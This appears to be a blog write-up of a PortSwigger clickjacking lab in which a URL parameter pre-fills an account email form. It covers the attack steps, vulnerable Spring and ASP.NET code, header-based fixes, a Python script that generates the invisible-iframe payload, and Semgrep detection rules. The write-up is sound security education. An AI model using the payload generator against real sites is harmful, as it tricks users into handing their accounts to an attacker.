---
title: "Lab 2: Clickjacking with form input data prefilled from a URL parameter"
date: 2026-04-07
categories: [portswigger, Clickjacking] 
tags: [clickjacking]
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-23-lab2_api_testing/
--- 

## 1. Executive Summary

**Vulnerability:** Clickjacking (UI Redressing) combined with Parameter Injection.

**Description:** The application relies on CSRF tokens to protect the "Update email" functionality, but it lacks anti-framing headers (like `X-Frame-Options`). Furthermore, the application allows users to pre-fill the email form field by supplying an `email` GET parameter in the URL. By embedding the target page in an invisible iframe and supplying a malicious email address in the URL, an attacker can stage the form with their own data. When the victim clicks a decoy button, they unwittingly submit the pre-filled form.

**Impact:** Unauthorized Account Modification. Because the victim clicks the real button within the invisible iframe, their browser includes their valid session cookies and CSRF token. The email address is successfully updated to the attacker's, potentially leading to full account takeover via password reset.

## 2. The Attack

**Objective:** Trick the victim into updating their account email to an attacker-controlled address by overlapping an invisible iframe over a decoy button.

1. **Reconnaissance & Pre-loading:**
    - I logged in as `wiener`.
    - I inspected the `/my-account` page. I discovered that appending `?email=hacker@evil.com` to the URL automatically populated the "Email" input field with that exact string.
    - I verified the HTTP response headers were missing `X-Frame-Options` and `Content-Security-Policy`.
2. **Payload Construction:**
    - I navigated to the Exploit Server and drafted the malicious HTML.
    - **The Trap (Layer 2):** I set the `<iframe>` source to the target URL **including the pre-populated email parameter**:
        
        `src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com"`. I set this layer to `z-index: 2` and `opacity: 0.1`.
        
    - **The Decoy (Layer 1):** I created a `<div>` with the text "Click me" at `z-index: 1`.
3. **Alignment & Exploitation:**
    - I used the Exploit Server's "View exploit" feature to visually align the buttons. I adjusted the `top` and `left` CSS properties of the decoy `<div>` until "Click me" sat directly beneath the faint "Update email" button.
    - Once perfectly aligned, I changed the iframe's `opacity` to `0.0001`, making it completely invisible.
    - I delivered the exploit. When the victim clicked "Click me", they actually clicked "Update email", submitting the form containing `hacker@evil.com`.

## 3. Code Review

*This section analyzes why the application is vulnerable. The root cause is the missing anti-framing headers, but we also look at how the pre-population is handled.*

**Vulnerability Analysis (Explanation):**

Pre-filling form fields via query parameters is a standard UI/UX feature. It is not inherently dangerous. However, when combined with a lack of framing protection, it becomes a critical weapon. The backend blindly accepts the GET parameter and renders it directly into the HTML `<input>` tag's `value` attribute.

### Java (Spring Boot / Thymeleaf)

```java
@GetMapping("/my-account")
public String accountPage(@RequestParam(value = "email", required = false) String email, Model model) {
    // The email parameter is extracted from the URL and passed to the view
    model.addAttribute("newEmail", email);
    return "account";
}
```

```java
<form action="/my-account/change-email" method="POST">
    <input type="hidden" name="_csrf" value="${_csrf.token}"/>
    <label>Email:</label>
    <input type="email" name="email" th:value="${newEmail}">
    <button type="submit">Update email</button>
</form>
```

**Technical Flow & Syntax Explanation:**

- **`@RequestParam`**: Maps the query string parameter (`?email=...`) to the Java variable.
- **`th:value="${newEmail}"`**: The template engine injects the attacker's email into the input field before the page is sent to the browser. If the page had `X-Frame-Options: DENY`, this wouldn't matter because the attacker couldn't frame it. Without it, the attacker successfully "stages" the attack.

### C# (ASP.NET Core MVC)

```csharp
[HttpGet("my-account")]
public IActionResult Account(string email)
{
    // The framework automatically binds the query string to 'email'
    var model = new AccountViewModel { Email = email };
    return View(model);
}
```

```html
<form method="post" asp-action="UpdateEmail">
    @Html.AntiForgeryToken()
    <input asp-for="Email" class="form-control" />
    <button type="submit">Update email</button>
</form>
```

**Technical Flow & Syntax Explanation:**

- **`asp-for="Email"`**: The Tag Helper automatically sets the `value` attribute of the HTML input to the string passed via the URL. Because ASP.NET Core does not inject anti-framing headers by default, this pre-filled state is easily weaponized in an iframe.

## 4. The Fix

**Explanation of the Fix:**

You do not need to remove the pre-population feature. You simply need to prevent the page from being framed by external domains. The fix is identical to basic clickjacking: enforce UI isolation.

### Secure Java

```java
@Configuration
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                // SECURE: Instructs the browser to block external framing
                .frameOptions().sameOrigin()
                .contentSecurityPolicy("frame-ancestors 'self'");
    }
}
```

### Secure C#

```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    // SECURE: Inject framing protection headers globally
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("X-Frame-Options", "SAMEORIGIN");
        context.Response.Headers.Add("Content-Security-Policy", "frame-ancestors 'self'");
        await next();
    });

    app.UseRouting();
    // ...
}
```

## 5. Automation

*A Python script to generate the HTML payload for the Exploit Server. It dynamically constructs the pre-populated URL and outputs the CSS/HTML.*

```python
#!/usr/bin/env python3
import argparse

def generate_clickjacking_payload(lab_id, target_path, attacker_email, top, left):
    # Construct the target URL with the pre-populated GET parameter
    target_url = f"https://{lab_id}.web-security-academy.net{target_path}?email={attacker_email}"
    
    html_payload = f"""
<!DOCTYPE html>
<html>
<head>
    <style>
        #target_website {{
            position: relative;
            width: 700px;
            height: 700px;
            opacity: 0.0001; /* Invisible for exploitation */
            z-index: 2;
        }}
        #decoy_website {{
            position: absolute;
            width: 300px;
            height: 400px;
            /* Adjust these values to align the buttons */
            top: {top}px;
            left: {left}px;
            z-index: 1;
        }}
        .decoy-btn {{
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }}
    </style>
</head>
<body>
    <div id="decoy_website">
        <h2>Win a Prize!</h2>
        <button class="decoy-btn">Click me</button>
    </div>
    
    <iframe id="target_website" src="{target_url}"></iframe>
</body>
</html>
"""
    return html_payload

def main():
    parser = argparse.ArgumentParser(description="Generate Clickjacking Payload with Pre-population")
    parser.add_argument("lab_id", help="The unique PortSwigger Lab ID")
    parser.add_argument("--email", default="hacker@evil.com", help="The email to pre-fill")
    parser.add_argument("--top", default="400", help="CSS Top value for decoy")
    parser.add_argument("--left", default="80", help="CSS Left value for decoy")
    
    args = parser.parse_args()
    
    payload = generate_clickjacking_payload(args.lab_id, "/my-account", args.email, args.top, args.left)
    
    print("[*] Copy the following HTML into your Exploit Server:")
    print("-" * 50)
    print(payload)
    print("-" * 50)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

Because the root vulnerability (missing anti-framing headers) is the same as the basic clickjacking lab, the Static Analysis rules focus on detecting the absence or explicit disabling of these critical headers.

### Java Rule

```yaml
rules:
  - id: java-spring-xframeoptions-disabled
    languages: [java]
    message: |
      Spring Security's X-Frame-Options protection has been explicitly disabled. 
      This leaves the application vulnerable to Clickjacking (UI Redressing) and pre-population attacks.
      Remove this configuration to restore the default protection, or use '.sameOrigin()'.
    severity: ERROR
    patterns:
      - pattern: |
          $HTTP. ... .headers(). ... .frameOptions().disable()
```

**Technical Flow & Syntax Explanation:**

- **`$HTTP`**: This metavariable matches the `HttpSecurity` object passed into Spring's configuration method.
- **`.headers(). ... .frameOptions()`**: This navigates the fluent API chain to the specific configuration block for framing options. The `...` ellipsis operator allows Semgrep to match this even if other configurations (like CSRF or CORS) are chained in between.
- **`.disable()`**: This is the critical sink. By finding the exact method call that turns off the default protection, Semgrep accurately flags code where a developer has intentionally (and insecurely) stripped the `X-Frame-Options` header from HTTP responses.

### C# Rule

```yaml
rules:
  - id: csharp-missing-security-headers
    languages: [csharp]
    message: |
      The application configuration lacks global security headers middleware.
      Ensure you inject 'X-Frame-Options' or 'Content-Security-Policy: frame-ancestors' 
      to protect against Clickjacking and staged UI attacks.
    severity: WARNING
    patterns:
      - pattern-inside: |
          public void Configure(IApplicationBuilder $APP, ...) {
            ...
          }
      - pattern-not-inside: |
          public void Configure(IApplicationBuilder $APP, ...) {
            ...
            $APP.UseSecurityHeaders(...); 
            ...
          }
      - pattern-not-inside: |
          public void Configure(IApplicationBuilder $APP, ...) {
            ...
            $CONTEXT.Response.Headers.Add("X-Frame-Options", ...);
            ...
          }
```

**Technical Flow & Syntax Explanation:**

- **`pattern-inside`**: This directive scopes the search strictly to the `Configure` method in ASP.NET Core (`Startup.cs` or `Program.cs` in newer .NET), which is where the HTTP middleware pipeline is defined.
- **`pattern-not-inside: $APP.UseSecurityHeaders(...)`**: This is a negative filter. It checks if the developer is using a common third-party package (like `NetEscapades.AspNetCore.SecurityHeaders`) to apply security headers globally. If this exists, Semgrep assumes the app is protected and stops analyzing.
- **`pattern-not-inside: $CONTEXT.Response.Headers.Add(...)`**: This second negative filter checks for the manual approach of injecting the `X-Frame-Options` header via custom middleware. If neither of these safe patterns is found inside the `Configure` method, Semgrep flags the application as potentially vulnerable to framing.